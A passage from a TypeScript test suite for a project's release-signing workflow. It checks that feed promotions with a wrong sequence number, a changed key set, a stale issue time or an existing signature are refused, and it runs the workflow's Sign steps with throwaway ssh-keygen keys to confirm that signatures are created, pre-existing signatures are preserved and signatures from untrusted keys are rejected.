  it("refuses a promotion with the wrong number, a changed key set, a stale issue time or an existing signature", () => {
    const number = world({ branch: true });
    const high = JSON.parse(resignFeed(number.latest, NOW)) as { seq: number };
    high.seq = 9;
    put(number, JSON.stringify(high), promoteRelease(number.stable, number.latest, "0.1.0", NOW));
    expect(check(number, { MODE: "promote", VERSION: "0.1.0" }).stderr).toMatch(/expected/);
    const keysChanged = world({ branch: true });
    const other = JSON.parse(resignFeed(keysChanged.latest, NOW)) as { keySetVersion: number };
    other.keySetVersion = 2;
    put(keysChanged, JSON.stringify(other), promoteRelease(keysChanged.stable, keysChanged.latest, "0.1.0", NOW));
    expect(check(keysChanged, { MODE: "promote", VERSION: "0.1.0" }).stderr).toMatch(/key set/);
    const stale = world({ branch: true });
    const old = NOW - 2 * day;
    put(stale, resignFeed(stale.latest, old), promoteRelease(stale.stable, stale.latest, "0.1.0", old));
    expect(check(stale, { MODE: "promote", VERSION: "0.1.0" }).stderr).toMatch(/issued/);
    const staleStable = world({ branch: true });
    put(staleStable, resignFeed(staleStable.latest, NOW), promoteRelease(staleStable.stable, staleStable.latest, "0.1.0", old));
    const staleStableDone = check(staleStable, { MODE: "promote", VERSION: "0.1.0" });
    expect(staleStableDone.status).toBe(1);
    expect(staleStableDone.stderr).toMatch(/stable\.json was issued/);
    const signed = world({ branch: true });
    put(signed, resignFeed(signed.latest, NOW), promoteRelease(signed.stable, signed.latest, "0.1.0", NOW));
    writeFileSync(join(signed.dir, "site/latest.json.sig"), "old");
    expect(check(signed, { MODE: "promote", VERSION: "0.1.0" }).stderr).toMatch(/already exists/);
  });

  it("refuses a promotion without VERSION or with no feed branch", () => {
    const w = world({ branch: true });
    put(w, resignFeed(w.latest, NOW), promoteRelease(w.stable, w.latest, "0.1.0", NOW));
    expect(check(w, { MODE: "promote" }).status).not.toBe(0);
    const missing = world({ branch: false });
    put(missing, resignFeed(missing.latest, NOW), promoteRelease(missing.stable, missing.latest, "0.1.0", NOW));
    const done = check(missing, { MODE: "promote", VERSION: "0.1.0" });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/a promotion needs a feed branch/);
  });
});

// The Sign steps themselves: the `run` text is taken from the workflow and run with a throwaway key.
describe("the Sign steps", () => {
  type Steps = { jobs: Record<string, { steps: { name?: string; run?: string }[] }> };
  const stepRun = (file: string, job: string, name: string): string => {
    const found = (parse(readFileSync(join(repoRoot, ".github/workflows", file), "utf8")) as Steps).jobs[job]?.steps.find(step => step.name === name)?.run;
    if (!found) throw new Error(`no step ${name} in ${job}`);
    return found;
  };
  const cases = [
    { file: "release.yml", job: "sign", name: "Sign", secret: "RELEASE_SSH_KEY", ns: "release@morndo.github.io", dir: "dist", files: ["manifest.json", "install.sh"], trust: "release_allowed_signers" },
    { file: "release.yml", job: "feed-sign", name: "Sign the feeds", secret: "FEED_SSH_KEY", ns: "feed@morndo.github.io", dir: "site", files: ["latest.json", "stable.json"], trust: "feed_allowed_signers" },
    { file: "feed.yml", job: "resign-sign", name: "Sign the feeds", secret: "FEED_SSH_KEY", ns: "feed@morndo.github.io", dir: "site", files: ["latest.json", "stable.json"], trust: "feed_allowed_signers" },
  ] as const;

  function keyPair(dir: string, label: string) {
    const key = join(dir, label);
    expect(spawnSync("ssh-keygen", ["-t", "ed25519", "-f", key, "-N", "", "-C", label, "-q"]).status).toBe(0);
    const pub = spawnSync("ssh-keygen", ["-y", "-f", key], { encoding: "utf8" }).stdout.trim();
    return { private: readFileSync(key, "utf8"), pub };
  }

  function setup(c: (typeof cases)[number], p: { trusted?: "same" | "other" } = {}) {
    const dir = temp();
    const temps = join(dir, "runner");
    mkdirSync(temps);
    mkdirSync(join(dir, c.dir));
    mkdirSync(join(dir, "trust"));
    for (const file of c.files) writeFileSync(join(dir, c.dir, file), `{"file":"${file}"}\n`);
    const mine = keyPair(dir, "mine");
    const other = keyPair(dir, "other");
    const trusted = p.trusted === "other" ? other.pub : mine.pub;
    writeFileSync(join(dir, "trust", c.trust), `${c.ns} namespaces="${c.ns}" ${trusted}\n`);
    return { dir, temps, key: mine.private };
  }
  const exec = (c: (typeof cases)[number], w: ReturnType<typeof setup>) => spawnSync("/bin/bash", ["-c", stepRun(c.file, c.job, c.name)], {
    cwd: w.dir, encoding: "utf8",
    env: { PATH: process.env.PATH ?? "", RUNNER_TEMP: w.temps, [c.secret]: w.key },
  });

  it.each(cases)("$job signs both files, checks the signatures against the allowed signers, and leaves no key behind", c => {
    const w = setup(c);
    const done = exec(c, w);
    expect(done.status, done.stderr).toBe(0);
    for (const file of c.files) expect(existsSync(join(w.dir, c.dir, `${file}.sig`))).toBe(true);
    expect(readdirSync(w.temps)).toEqual([]);
  });

  it.each(cases)("$job refuses a file that already has a signature, and keeps that signature as it was", c => {
    const w = setup(c);
    const first = c.files[0]!;
    writeFileSync(join(w.dir, c.dir, `${first}.sig`), "old signature\n");
    const done = exec(c, w);
    expect(done.status).not.toBe(0);
    expect(done.stderr).toMatch(/already exists/);
    expect(readFileSync(join(w.dir, c.dir, `${first}.sig`), "utf8")).toBe("old signature\n");
    expect(readdirSync(w.temps)).toEqual([]);
  });

  it.each(cases)("$job fails when the new signature does not verify against the allowed signers", c => {
    const w = setup(c, { trusted: "other" });
    const done = exec(c, w);
    expect(done.status).not.toBe(0);
    expect(readdirSync(w.temps)).toEqual([]);
  });
});
